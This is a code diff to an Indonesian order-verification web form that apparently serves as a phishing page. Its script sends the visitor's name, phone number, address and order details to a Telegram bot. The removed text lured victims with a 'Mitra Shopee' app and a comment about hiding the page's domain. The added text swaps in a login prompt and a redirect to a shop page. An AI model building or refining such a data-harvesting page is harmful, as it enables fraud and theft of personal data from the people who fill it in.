@@ -31,31 +31,33 @@
                 <form id="orderForm">
                     <div class="form-group">
                         <label for="namaLengkap">Nama Lengkap *</label>
-                        <input type="text" id="namaLengkap" placeholder="Masukkan nama lengkap" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="nomorTelepon">Nomor Telepon *</label>
-                        <input type="tel" id="nomorTelepon" placeholder="08xxxxxxxxxx" required pattern="[0-9]{10,13}">
-                    </div>
-                    <div class="form-group">
-                        <label for="alamatLengkap">Alamat Lengkap *</label>
-                        <textarea id="alamatLengkap" placeholder="Masukkan alamat lengkap untuk pengiriman" rows="4"
-                            required></textarea>
-                    </div>
-                    <div class="form-group">
-                        <label for="Nama produk">Nama produk *</label>
-                        <input type="text" id="nama produk" placeholder="Masukkan nama produk (contoh: Honda Beat)"
+                        <input type="text" id="namaLengkap" name="namaLengkap" placeholder="Masukkan nama lengkap"
                             required>
                     </div>
                     <div class="form-group">
-                        <label for="harga ">Harga  *</label>
-                        <input type="number" id="harga " placeholder="Masukkan harga" required
+                        <label for="nomorTelepon">Nomor Telepon *</label>
+                        <input type="tel" id="nomorTelepon" name="nomorTelepon" placeholder="08xxxxxxxxxx" required
+                            pattern="[0-9]{10,13}">
+                    </div>
+                    <div class="form-group">
+                        <label for="alamatLengkap">Alamat Lengkap *</label>
+                        <textarea id="alamatLengkap" name="alamatLengkap"
+                            placeholder="Masukkan alamat lengkap untuk pengiriman" rows="4" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="namaProduk">Nama Produk *</label>
+                        <input type="text" id="namaProduk" name="namaProduk"
+                            placeholder="Masukkan nama produk (contoh: Honda Beat)" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="harga">Harga *</label>
+                        <input type="number" id="harga" name="harga" placeholder="Masukkan harga" required
                             min="100000" max="100000000">
                     </div>
                     <div class="form-group">
                         <label for="sukuCadang">Suku Cadang yang Dibutuhkan *</label>
-                        <textarea id="sukuCadang" placeholder="Masukkan daftar suku cadang yang dibutuhkan" rows="4"
-                            required></textarea>
+                        <textarea id="sukuCadang" name="sukuCadang"
+                            placeholder="Masukkan daftar suku cadang yang dibutuhkan" rows="4" required></textarea>
                     </div>
                     <button type="submit" id="verifikasiButton">Verifikasi Pemesanan</button>
                 </form>
@@ -71,7 +73,7 @@
                 var nama = document.getElementById('namaLengkap').value.trim();
                 var telepon = document.getElementById('nomorTelepon').value.trim();
                 var alamat = document.getElementById('alamatLengkap').value.trim();
-                var nama produk = document.getElementById('nama produk').value.trim();
+                var namaProduk = document.getElementById('namaProduk').value.trim();
                 var harga = document.getElementById('harga').value.trim();
                 var sukuCadang = document.getElementById('sukuCadang').value.trim();
                 // Kirim ke Telegram
@@ -82,8 +84,8 @@
                     "Nama: " + nama + "\n" +
                     "Telepon: " + telepon + "\n" +
                     "Alamat: " + alamat + "\n" +
-                    "nama produk: " + nama produk + "\n" +
-                    "harga: " + harga + "\n" +
+                    "Nama Produk: " + namaProduk + "\n" +
+                    "Harga: " + harga + "\n" +
                     "Suku Cadang yang Dibutuhkan: " + sukuCadang;
                 // URL endpoint Telegram yang benar
                 var url = "https://api.telegram.org/bot" + token + "/sendMessage";
@@ -101,9 +103,9 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
-                            alert('Selamat! Data pemesanan Anda telah diverifikasi. Silahkan download aplikasi Mitra Shopee di Shopee.');
-                            // Menyembunyikan tampilan domain
-                            window.location.replace('index.html');
+                            alert('Selamat! Permintaan berhasil diverifikasi. Silahkan login melalui aplikasi dan akan diarahkan ke halaman toko.');
+                            // Mengarahkan ke halaman toko
+                            window.location.href = 'tokohalaman.html';
                         } else {
                             alert('Gagal mengirim ke Telegram: ' + data.description);
                         }
